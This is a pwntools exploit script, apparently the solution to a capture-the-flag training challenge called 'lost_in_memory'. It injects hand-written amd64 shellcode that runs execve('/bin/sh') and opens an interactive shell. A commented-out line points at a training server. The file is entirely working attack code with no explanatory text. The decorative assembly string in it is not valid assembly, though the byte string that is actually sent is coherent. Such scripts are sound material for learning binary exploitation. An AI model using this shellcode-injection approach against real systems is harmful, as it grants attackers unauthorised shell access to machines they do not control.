from pwn import *
asm_code = """
    lea rdi, [rip]
    mov rax, 0x3b
    add rdi, 13
    syscall + /bin/sh
"""
context.arch = 'amd64'
shellcode = b"\x48\x8D\x3D\x00\x00\x00\x00\x48\xC7\xC0\x3B\x00\x00\x00\x48\x83\xC7\x0D\x0F\x05/bin/sh\x00"
p = process("./chall/lost_in_memory")
#p = remote("bin.training.offdef.it", 4001)
"""gdb.attach(p, '''
    b append_stub ''')
input("wait")"""
p.send(shellcode)
p.interactive()